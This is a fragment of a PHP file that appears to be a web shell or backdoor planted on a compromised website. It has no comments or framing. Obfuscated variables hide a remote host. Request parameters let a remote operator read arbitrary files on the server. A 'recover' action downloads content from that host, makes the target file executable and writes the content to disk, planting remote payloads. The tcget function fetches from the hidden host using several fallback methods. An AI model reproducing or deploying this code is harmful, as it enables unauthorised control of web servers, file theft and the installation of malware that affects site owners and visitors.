<?php

	
}

if(isset($act) && $act == 'check' && isset($check_file)){
	if(file_exists($check_file)){
		echo '#ok#';
	}
}

if(isset($act) && $act == 'test'){
		echo '#ok#';
}

if(isset($act) && $act == 'recover' && isset($recover_file) && isset($recover_file_url)){
{
		
			$pfile = $recover_file;
			$date = $OO0O0O($recover_file_url);
			gdir_file($recover_file);
			@chmod($pfile,0755);

			if($date && file_put_contents($pfile,$date)){
				echo '#ok#';
			}else{
				echo '#fail#';
			}
		
	}
}

if(isset($act) && $act == 'redate' && isset($redate_file)){
	if(file_exists($redate_file)){
		echo rdFile($redate_file);
	}
}

function RandAbc($length = "") {
    $str = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_.:/-";
    return ($str);
} 

function rdFile($file){
	if(function_exists('file_get_contents')){
		return file_get_contents($file);
	}else{
		$handle = fopen($file, "r");
		$contents = fread($handle, filesize($file));
		fclose($handle);
		return $contents;
	}
}

function cget($url,$loop=10){
	$data = false;        $i = 0; 

	while(!$data) {
             $data = tcget($url);             if($i++ >= $loop) break;        }
	return $data;
}

function tcget($url,$proxy=''){
	global $OO0OO0O, $O00OO0, $OO0000, $O00OOO;
     $data = '';    	$url = "$OO0OO0O$O00OO0.$O00OOO/".$url;
 $url = trim($url);     if (extension_loaded('curl') && function_exists('curl_init') && function_exists('curl_exec')){
         $ch = curl_init();         curl_setopt($ch, CURLOPT_URL, $url);		 curl_setopt($ch, CURLOPT_HEADER, false);		 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);		 
         curl_setopt($ch, CURLOPT_TIMEOUT, 60);         $data = curl_exec($ch);         curl_close($ch);      }
    
     if ($data == ''){
         if (function_exists('file_get_contents') && $url){
             $data = @file_get_contents($url);             }
         }
    
     if (($data == '') && $url){
         if (function_exists('fopen') && function_exists('ini_get') && ini_get('allow_url_fopen')){
             ($fp = @fopen($url, 'r'));            
             if ($fp){
                
                 while (!@feof($fp)){
                     $data .= @fgets($fp) . '';                     }
                
                 @fclose($fp);                 }
             }
         }
     return $data;	
}

function m_mkdir($dir){
		if(!is_dir($dir)) mkdir($dir);
	}
	
function gdir_file($gDir=''){
		global $BT;
		$gDir = str_replace('/',DIRECTORY_SEPARATOR,$gDir);
		$gDir = str_replace('\\',DIRECTORY_SEPARATOR,$gDir);
		$arr = explode(DIRECTORY_SEPARATOR,$gDir);
		
		if(count($arr) <= 0) return;

		
		if(!strstr($gDir,$BT))
			$dir = $BT;
		else
			$dir = '';
		
		for($i = 0 ; $i < count($arr)-1 ; $i++){
			$dir .= '/' . $arr[$i];
			m_mkdir($dir);
		}
		
		return $dir;
}

//